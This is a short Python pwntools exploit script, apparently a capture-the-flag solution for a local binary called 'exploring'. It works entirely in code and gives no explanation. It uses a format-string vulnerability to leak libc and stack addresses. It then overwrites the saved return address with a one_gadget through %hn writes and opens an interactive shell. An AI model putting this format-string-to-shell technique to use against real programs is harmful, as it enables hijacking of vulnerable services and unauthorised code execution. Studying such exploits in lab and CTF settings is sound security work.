from pwn import *

#context.log_level = "debug"
#context.terminal = ["tmux", "split", "-h"]

io = remote("127.0.0.1", 2333)
#io = process("./exploring")

payload = "%17$pAAA%14$pBBB"
io.sendlineafter("unknown!\n", payload)
libc = ELF("./libc.so.6")
libc.address = int(io.recvuntil("AAA", drop=True), 16) - 0x20830
log.success("libc: "+hex(libc.address))
stack = int(io.recvuntil("BBB", drop=True), 16) - 0x130
log.success("stack: "+hex(stack))
one_gadget = libc.address + 0x45216 # 0x4526a, 0xf02a4, 0xf1147

# ret: 0x7ffff47a9e98(17)
payload = "%{:08d}c%10$hn".format(one_gadget&0xffff)
payload += "%{:08d}c%11$hn".format( (((one_gadget>>16)&0xffff)+0x10000-one_gadget&0xffff)&0xffff )
payload += p64(stack+0x58)+p64(stack+0x5a)
io.sendline(payload)
io.interactive()